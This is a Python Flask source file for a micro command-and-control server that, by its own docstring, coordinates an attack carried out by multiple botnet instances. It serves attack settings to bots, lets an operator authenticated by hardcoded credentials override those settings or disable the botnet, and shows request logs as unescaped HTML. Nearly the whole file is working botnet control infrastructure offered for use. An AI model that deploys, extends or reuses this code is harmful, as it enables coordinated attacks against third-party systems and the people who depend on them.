from flask import Flask
from flask import request
from CCServer import CCServer 

import logging
from logging.handlers import RotatingFileHandler
from datetime import datetime 

app = Flask(__name__)

"""
This is a simple implementation of a micro Command-and-Control Server using Flask. 
Its purpose is to provide a lightweight and simple interface to coordinate an attack carried
by multiple botnet instances, ideally deployed 'round-the-clock'

(please note that in this implementation the server handles just one request at a time - flask default)
"""

# log file path
logPath      = './data/ccserver.log'

# parameters for CC instance
settingsPath = './data/settings.json'
credentialsD = {
    'admin_usr' : "fsociety",
    'admin_pwd' : "steelmountain"
}
# creating CC instance
CC = CCServer(settingsPath, credentialsD)



# ROUTING SERVER - settings retrieval 
@app.route('/settings', methods=['GET'])
def getSettings():
    # retrieving settings
    settings = CC.retrieveSettings()
    # logging the request
    app.logger.info("[{0}] => reached by {1} : configuration update required".format(str(datetime.utcnow()), request.remote_addr))

    return settings, 200



# ROUTING SERVER - update settings 
@app.route('/update', methods=['POST'])
def updateSettings():
    # retrieving username and password 
    if CC.authenticate({ 'auth_usr'  : request.json['username'], 'auth_pwd' : request.json['password'] }): 
        # if user is correctly authenticated we can performe update op.
        try:
            CC.updateSettings(request.json['settings'])
            app.logger.info("[{0}] => reached by {1} / {2}: settings override!".format(str(datetime.utcnow()), request.remote_addr, request.json['username']))
            return "Override succeded", 200
        except KeyError as error:
            # if settings is missing as a param... update cannot be carried on
            app.logger.info("[{0}] => reached by {1} / {2}: override failure, missing params!".format(str(datetime.utcnow()), request.remote_addr, request.json['username']))
            return "Bad request, override failure", 400

    else:
        # if user was not authenticated properly, we log the event and return a forbidden status
        app.logger.info("[{0}] => reached by {1} / {2}: forbidden!".format(str(datetime.utcnow()), request.remote_addr, request.json['username']))
        return "Forbidden!", 403



# ROUTING SERVER - logs visualization (debug purposes)
@app.route('/logs', methods=['GET'])
def getLog():
    # simply returning log lines from logging file 
    logresult = "<h1> LOG / {0} </h1> </br>".format(str(datetime.utcnow()))
    with open(logPath) as logFile:
        for entry in logFile.readlines():
            logresult += entry + "</br>"

    return logresult, 200



# ROUTING SERVER - disable the botnet via C&C
@app.route('/disable', methods=['POST'])
def disableBotnet():
    # retrieving username and password 
    if CC.authenticate({ 'auth_usr'  : request.json['username'], 'auth_pwd' : request.json['password'] }): 
        # if user is correctly authenticated we can performe update op.
        try:
            CC.updateSettings({}, enable=False)
            app.logger.info("[{0}] => reached by {1} / {2}: botnet disabled!".format(str(datetime.utcnow()), request.remote_addr, request.json['username']))
            return "Botnet disabled!", 200
        except KeyError as error:
            # if settings is missing as a param... update cannot be carried on
            app.logger.info("[{0}] => reached by {1} / {2}: botnet disable, missing params!".format(str(datetime.utcnow()), request.remote_addr, request.json['username']))
            return "Bad request, botnet disable failure", 400
    else:
        # if user was not authenticated properly, we log the event and return a forbidden status
        app.logger.info("[{0}] => reached by {1} / {2}: disable operation forbidden!".format(str(datetime.utcnow()), request.remote_addr, request.json['username']))
        return "Forbidden!", 403


# ---------------------------------------------------------------------#
#                      SERVER START UP ROUTINE                         #
# ---------------------------------------------------------------------#
if __name__ == "__main__": 
    # adding log handler provided by werkzeug lib ... 
    handler = RotatingFileHandler(logPath, maxBytes=10000, backupCount=1)
    # ... but first we need to set log level! 
    handler.setLevel(logging.INFO)
    logging.basicConfig(level=logging.INFO)
    app.logger.addHandler(handler)

    # running server
    app.run()